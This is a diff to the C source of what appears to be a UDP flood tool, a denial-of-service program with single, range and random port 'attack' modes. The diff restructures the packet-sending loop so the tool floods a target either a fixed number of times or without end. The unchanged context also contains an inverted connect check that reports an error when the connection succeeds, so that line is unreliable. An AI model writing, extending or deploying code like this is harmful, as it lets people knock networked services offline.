@@ -73,23 +73,27 @@ static void single4_port(void)
 	// so for calling connect and the write one time involves the this steps by the kernel:
 	// connect the socket , output fist datagram.
 	if (!connect(connection->sock, (SA *)&in, sizeof(in)))
-		//TODO
 		INFOEE("Udp4 socket can't be connected");
 
-	//TODO
-	if (!packets) {
-		for (;;) {
-			n = write(connection->sock, connection->buff, connection->bufflen);
-			if (!n)
-				break;
-		}
-	} else {
-		for (uint64_t i = 0; i < packets; i++) {
-			n = write(connection->sock, connection->buff, connection->bufflen);
-			if (!n)
-				break;
-		}
+	// if we have a specific number of packets
+	for(uint64_t i=0; i<packets; i++) {
+		n = write(connection->sock, connection->buff, connection->bufflen);
+		if (!n)
+			break;
 	}
+	
+	// if we already send the packets end it.
+	if(packets>0) goto ret;
+	
+	// it means that we have infinite packets.
+	for (;;) {
+		n = write(connection->sock, connection->buff, connection->bufflen);
+		if (!n)
+			break;
+	}
+
+ret:
+	return;
 }
 static void random4_port(void)
 {
@@ -170,7 +174,7 @@ void udp_flood_init(conn_t *conn, arguments args)
 
 	// assign singleton with the new connection
 	connection = conn;
-	packets = args.packets;
+	packets	= args.packets;
 	// now we should test if we are dealing with single,range or random port attack
 	if (args.port.random) {
 		DEBUG("Udp flood is choosing random port attack implementation");
